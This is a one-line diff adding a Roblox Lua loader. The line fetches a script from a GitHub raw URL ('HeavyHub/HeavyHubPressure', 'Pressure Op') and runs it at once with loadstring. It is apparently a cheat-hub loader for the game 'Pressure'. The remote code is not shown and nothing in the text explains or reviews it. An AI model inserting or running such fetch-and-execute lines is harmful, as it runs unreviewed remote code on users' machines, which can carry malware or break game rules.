@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HeavyHub/HeavyHubPressure/refs/heads/main/Pressure%20Op"))()
